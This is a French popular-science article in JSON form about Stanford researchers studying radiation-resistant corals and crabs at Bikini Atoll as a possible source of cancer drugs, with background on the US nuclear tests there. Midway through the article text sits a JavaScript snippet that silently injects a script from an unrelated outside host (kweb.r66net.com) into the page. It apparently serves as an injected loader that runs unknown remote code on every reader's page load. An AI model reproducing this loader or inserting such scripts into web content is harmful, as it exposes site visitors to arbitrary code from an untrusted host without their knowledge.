{"title": "Les coraux de Bikini, l'atoll des tests nucleaires, une arme contre le cancer ?", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-07-04", "content": "Les crateres laisses par les tests nucleaires de l'atoll de Bikini sont contamines par la radioactivite et pourtant des coraux y prosperent sans probleme. Des biologistes marins veulent percer le secret de cette resistance en esperant y trouver de nouvelles armes contre le cancer. Ce qu'il faut retenir Les radiations augmentent les risques de developpement d'un cancer mais certains animaux semblent plus resistants que les autres : c'est le cas des batisseurs de recifs sur l'atoll de Bikini, ou des tests nucleaires importants ont eu lieu, rendant l'endroit inhabitable. Des biologistes ont entrepris d'etudier les genes de ces coraux et d'autres animaux de cet atoll. Ces coraux detiennent peut-etre de nouvelles molecules precieuses pour la chimiotherapie. Plusieurs des armes dont dispose la medecine pour lutter contre le  cancer  par  chimiotherapie  ont ete trouvees en etudiant les plantes tropicales. C'est le cas, par exemple, de la vinblastine et de la vincristine, les premiers vinca-alcaloides, isoles a partir des feuilles de la pervenche de Madagascar. Leurs proprietes  antidiabetiques  etaient connues depuis longtemps mais a la fin des annees 1950, on a decouvert qu'ils constituaient un traitement souvent efficace contre la  leucemie infantile . A bien des egards, les barrieres coralliennes, comme celle de l'Australie qui a ete etudiee par le  Catlin Seaview Survey , sont des equivalents des grandes  forets tropicales  et il n'est pas absurde d'imaginer que certaines des  molecules  presentes chez les plantes ou les animaux qui y vivent pourraient egalement etre de bons medicaments. C'est le raisonnement que tient  Stephen Palumbi , un specialiste de la biologie et de l' ecologie  marine a l'universite de Stanford et qui travaille sur les coraux. Avec son etudiante Elora Lopez, Palumbi a donc decide de prospecter l' ecosysteme  d'un  atoll  bien particulier des iles Marshall, dans l'ocean Pacifique : l'atoll de Bikini. Une video montrant l'un des premiers tests atomiques, baptise Baker, sur l'atoll de Bikini. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c) YouTube A Bikini, des crabes mangent de noix de coco radioactives Inscrit au patrimoine mondial de l'Unesco, cet atoll est tristement celebre comme un des symboles de l'entree de l'humanite dans l'age du nucleaire. C'est la que les Etats-Unis, de 1946 a 1958, ont conduit 23 essais nucleaires atmospheriques avant que ces essais ne soient bannis par un  moratoire  en 1958 signe par la Grande-Bretagne, l'URSS et les Etats-Unis, prelude au Traite d'interdiction partielle des essais nucleaires de 1963. C'est cependant dans un autre atoll des iles Marshall qu'a explose en 1952 la  premiere bombe H  baptisee Ivy Mike : l'atoll d'Eniwetok.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Mais c'est bien a Bikini qu'a eu lieu l'essai de la bombe H la plus puissante jamais testee par les Etats-Unis. L' energie  de l'explosion a atteint 15 megatonnes, ce qui represente mille fois plus que chacune des deux bombes atomiques larguees sur le Japon. Le nom de cette operation, Castle Bravo, est tragiquement entre dans l'histoire parce que des etres humains ont ete frappes par les retombees radioactives de l'explosion. L'atoll de Bikini lui-meme est devenu si pollue par les retombees des tests nucleaires que sa population n'a pu y revenir. Pourtant, les coraux ont recolonise l'atoll sans probleme et semblent donc avoir mis en place des mecanismes biologiques pour resister aux dommages des radiations, qui peuvent provoquer des cancers. Stephen Palumbi a entrepris d'etudier la  genetique  des coraux qui se trouvent aujourd'hui dans les crateres laisses par les explosions nucleaires. Elora Lopez s'occupe egalement des crabes qui mangent des  noix de coco  emplies d'un  isotope  radioactif provenant des eaux souterraines. Lopez et Palumbi compareront egalement leurs echantillons avec des specimens recueillis sur Bikini par des chercheurs de la  Smithsonian Institution  juste avant les essais atomiques. ", "theme": "sante"}